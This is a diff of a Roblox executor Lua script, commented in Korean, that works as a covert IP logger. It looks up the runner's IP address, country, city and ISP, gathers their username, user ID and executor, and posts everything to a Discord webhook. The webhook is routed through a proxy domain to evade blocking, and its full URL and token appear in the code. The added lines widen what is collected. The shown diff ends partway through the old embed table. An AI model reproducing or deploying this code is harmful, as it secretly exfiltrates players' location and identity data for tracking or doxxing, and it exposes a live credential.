@@ -1,39 +1,85 @@
--- 프록시를 적용한 새로운 웹훅 주소
+-- 원본 로직으로 복구 완료 (사용자 새 웹훅 주소 적용)
 local webhook = "https://discord.com/api/webhooks/1492431494319313030/C3DOY0zlWt960efXW1T9lp2sVOIWi4xQsH8ZS7cPcgCGzC9TXDuto3ve3GfLAP2tHx5F"
--- 디스코드 직접 전송이 막혔을 경우를 대비해 도메인을 프록시로 자동 변경
+-- 디스코드 차단 우회를 위한 프록시 설정
 local proxyWebhook = webhook:gsub("discord.com", "hooks.hyra.io")
 
 local http_request = http_request or request or syn.request or http.request or fluxus.request or Krnl.request or http_request 
 if not http_request then warn("HTTP 요청 함수를 찾을 수 없습니다!") return end 
 
--- [1] IP 정보 가져오기
-local ipData = { query = "알 수 없음", country = "N/A", city = "N/A" }
-local success, response = pcall(function() 
+-- IP 정보 가져오기 
+local ipSuccess, ipResponse = pcall(function() return http_request({ Url = "http://ip-api.com/json/?lang=ko", Method = "GET", Headers = { ["User-Agent"] = "RobloxExecutorIPLogger/1.0" } }) end) 
+
+local ipData = { query = "알 수 없음", country = "N/A", city = "N/A", isp = "N/A", lat = "N/A", lon = "N/A" } 
+
+if ipSuccess then 
+    local rawBody 
+    if type(ipResponse) == "string" then 
+        rawBody = ipResponse 
+    elseif type(ipResponse) == "table" then 
+        rawBody = ipResponse.Body or "" 
+    else 
+        rawBody = "" 
+    end 
+    
+    if rawBody ~= "" then 
+        local decodeSuccess, decoded = pcall(function() return game:GetService("HttpService"):JSONDecode(rawBody) end) 
+        if decodeSuccess and type(decoded) == "table" and decoded.status == "success" then 
+            ipData = decoded 
+        end 
+    end 
+end 
+
+-- 추가 정보 추출
+local playerName = "???" 
+local playerId = 0 
+if game.Players.LocalPlayer then 
+    playerName = game.Players.LocalPlayer.Name 
+    playerId = game.Players.LocalPlayer.UserId 
+end 
+
+local gameName = "알 수 없음" 
+local success, result = pcall(function() 
+    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
+end) 
+if success then gameName = result end 
+
+local extra = { 
+    username = playerName, 
+    userid = playerId, 
+    executor = identifyexecutor and identifyexecutor() or "알 수 없음", 
+    placeid = game.PlaceId or 0, 
+    gamename = gameName, 
+    time = os.date("%Y-%m-%d %H:%M:%S KST") 
+} 
+
+-- Embed 구성 (원본 스타일)
+local embed = { 
+    title = "Executor IP 로그 (테스트용)", 
+    description = "누군가 스크립트를 실행했습니다.", 
+    color = 16711680, 
+    fields = { 
+        {name = "IP", value = ipData.query or "N/A", inline = true}, 
+        {name = "국가", value = ipData.country or "N/A", inline = true}, 
+        {name = "도시", value = ipData.city or "N/A", inline = true}, 
+        {name = "ISP", value = ipData.isp or "N/A", inline = false}, 
+        {name = "닉네임", value = extra.username .. " (" .. tostring(extra.userid) .. ")", inline = false}, 
+        {name = "실행기", value = extra.executor, inline = false}, 
+        {name = "PlaceId", value = tostring(extra.placeid), inline = false}, 
+        {name = "게임 이름", value = extra.gamename, inline = false}, 
+        {name = "실행 시간", value = extra.time, inline = false} 
+    }, 
+    footer = {text = "IP 로그"} 
+} 
+
+-- 전송 (프록시 주소 사용)
+pcall(function() 
     return http_request({ 
-        Url = "http://ip-api.com/json/?lang=ko", 
-        Method = "GET" 
+        Url = proxyWebhook, 
+        Method = "POST", 
+        Headers = { ["Content-Type"] = "application/json" }, 
+        Body = game:GetService("HttpService"):JSONEncode({embeds = {embed}, username = "스크립트 IP 로그"}) 
     }) 
 end)
-
-if success and response.Body then
-    local decodeSuccess, decoded = pcall(function() return game:GetService("HttpService"):JSONDecode(response.Body) end)
-    if decodeSuccess and decoded.status == "success" then 
-        ipData = decoded 
-    end
-end
-
--- [2] 정보 정리
-local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "???"
-local executorName = (identifyexecutor and identifyexecutor()) or "알 수 없음"
-
--- [3] 디스코드 전송 (프록시 주소 사용)
-pcall(function()
-    http_request({
-        Url = proxyWebhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = game:GetService("HttpService"):JSONEncode({
-            username = "스크립트 IP 로그",
             embeds = {{
                 title = "🚀 프록시 우회 실행 로그",
                 color = 16711680,
